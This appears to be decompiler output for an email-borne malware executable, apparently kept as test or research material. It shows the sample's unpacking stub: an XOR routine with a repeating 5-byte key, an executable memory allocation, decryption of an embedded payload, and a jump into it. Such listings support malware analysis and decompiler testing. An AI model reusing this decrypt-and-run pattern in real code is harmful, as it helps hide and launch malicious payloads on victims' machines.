// subject.c
// Generated on 5/4/2015 1:17:47 AM by decompiling malware_via_email/malware_0596/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

word32 fn1310D000(word16 cx, word32 dwArg04, word32 dwArg08, word32 dwArg0C, word32 dwArg10, word32 dwArg14, word32 dwArg18, ptr32 cxOut)
{
	Mem12[dwArg10 + 0x00000000:word32] = dwArg0C;
	word32 ebx_105 = dwArg14;
	word16 wLoc10_111 = cx;
	word32 dwArg08_104 = dwArg08 + dwArg14;
	word16 cx_58;
	*cxOut = (word16) dwArg0C;
	dwArg0C = dwArg0C - 0x00000001;
	while (dwArg0C != 0x00000000)
	{
		Mem86[dwArg04 + 0x00000000:byte] = (byte) ((int32) Mem12[dwArg08_104 + 0x00000000:byte] ^ (word32) Mem12[(int32) wLoc10_111 + dwArg18:byte]);
		word32 edi_87 = (word32) wLoc10_111;
		wLoc10_111 = (word16) (edi_87 + 0x00000001);
		if ((int32) wLoc10_111 == 0x00000005)
			wLoc10_111 = 0x0000;
		dwArg04 = dwArg04 + 0x00000001;
		dwArg08_104 = dwArg08_104 + 0x00000001;
		ebx_105 = edi_87 + 0x00000001;
		*cxOut = (word16) dwArg0C;
		dwArg0C = dwArg0C - 0x00000001;
	}
	return ebx_105;
}

void fn1310D09B(word32 eax)
{
	WS2HELP.dll!WahOpenNotificationHandleHelper();
	WS2HELP.dll!WahOpenHandleHelper();
	WS2HELP.dll!WahOpenNotificationHandleHelper();
	WS2HELP.dll!WahOpenHandleHelper();
	word32 v6_37 = eax + (eax + 0x80040142);
	word32 esi_49 = Mem0[v6_37 + 0x930CD510:word32];
	word16 cx_68;
	fn1310D000((word16) (fp + 0xFFFFFDC4), fp + 0xFFFFFDC4, fp + 0xFFFFFDC4, 0x00000004, fp - 0x00000010, 0x00000000, fp + 0xFFFFFDCC, out cx_68);
	word32 ebx_76 = Mem0[v6_37 + 0x930CD514:word32];
	word16 cx_96;
	fn1310D000(cx_68, fp + 0xFFFFFDA8, fp + 0xFFFFFDA4, 0x00000004, fp - 0x00000010, 0x00000004, fp + 0xFFFFFDCC, out cx_96);
	word32 ebx_101 = Mem0[v6_37 + 0x930CD518:word32];
	word16 cx_121;
	fn1310D000((word16) (v6_37 + 0x930CD510), fp - 0x00000014, fp - 0x0000001C, 0x00000004, fp - 0x00000010, 0x00000008, fp + 0xFFFFFDCC, out cx_121);
	word32 eax_129 = GetModuleHandleA(0x00000000);
	word32 esi_137 = Mem0[v6_37 + 0x930CD51C:word32];
	word16 cx_159;
	fn1310D000((word16) (fp - 0x00000010), fp - 0x0000001C, fp - 0x00000028, 0x00000004, fp - 0x00000010, 0x0000000C, fp + 0xFFFFFDCC, out cx_159);
	word32 ecx_172 = Mem0[v6_37 + 0x930CD520:word32];
	word16 cx_194;
	fn1310D000((word16) ecx_172, fp + 0xFFFFFDB8, fp + 0xFFFFFDA8, 0x00000004, fp - 0x00000010, 0x00000010, fp + 0xFFFFFDCC, out cx_194);
	word32 esi_204 = ebx_101 * 0x00000008 + 0x0000000C;
	word32 v15_213 = esi_204 + ebx_76;
	word32 v7_39 = eax + (eax + 0x80040142);
	word32 v16_216 = v15_213 + esi_49;
	word32 dwLoc0248_174 = ecx_172;
	word32 dwLoc024C_199 = 0x00000014;
	word32 dwLoc24_202 = v6_37 + 0x930CD524;
	word32 eax_225 = VirtualAlloc(v7_39 - 0x800401F0, v16_216, 0x00003000, 0x00000040);
	word32 dwLoc0C_232 = esi_137 + eax_129 + esi_204;
	word32 dwLoc0264_236 = esi_204;
	word32 dwLoc08_237 = 0x00000000;
	word32 dwLoc18_238 = 0x00000000;
	while (0x00000001 != 0x00000000)
	{
		if (dwLoc0264_236 == dwLoc0248_174)
		{
			word32 esi_363 = dwLoc08_237 + 0x00000001;
			dwLoc08_237 = esi_363;
			if (esi_363 == ebx_101)
				goto l1310D460;
			word32 ecx_383 = fp - 0x0000001C - dwLoc024C_199;
			word32 edx_369 = Mem0[dwLoc24_202 + 0x00000000:word32];
			word16 cx_391;
			fn1310D000((word16) ecx_383, fp - 0x0000001C, ecx_383, 0x00000004, fp - 0x00000010, dwLoc024C_199, fp + 0xFFFFFDCC, out cx_391);
			word32 edi_401 = dwLoc24_202 + 0x00000004;
			word32 edi_398 = dwLoc024C_199 + 0x00000004;
			dwLoc0248_174 = Mem0[edi_401 + 0x00000000:word32];
			word16 cx_426;
			fn1310D000((word16) (fp - 0x00000010), fp + 0xFFFFFDB8, fp + 0xFFFFFDB8 - edi_398, 0x00000004, fp - 0x00000010, edi_398, fp + 0xFFFFFDCC, out cx_426);
			dwLoc024C_199 = edi_398 + 0x00000004;
			dwLoc24_202 = edi_401 + 0x00000004;
			dwLoc0264_236 = 0x00000000;
			dwLoc0C_232 = edx_369 + eax_129;
			goto l1310D41B;
		}
l1310D41B:
		Mem348[eax_225 + dwLoc18_238:byte] = Mem0[dwLoc0C_232 + 0x00000000:byte];
		dwLoc0C_232 = dwLoc0C_232 + 0x00000001;
		dwLoc18_238 = dwLoc18_238 + 0x00000001;
		dwLoc0264_236 = dwLoc0264_236 + 0x00000001;
	}
l1310D460:
	word32 esi_283 = eax_225 - esi_204;
	word16 cx_290;
	word32 ebx_291 = fn1310D000((word16) ebx_76, eax_225, esi_283, ebx_76, fp + 0xFFFFFDC8, esi_204, fp + 0xFFFFFDCC, out cx_290);
	(eax_225 + 0x00000F50)();
	return;
}

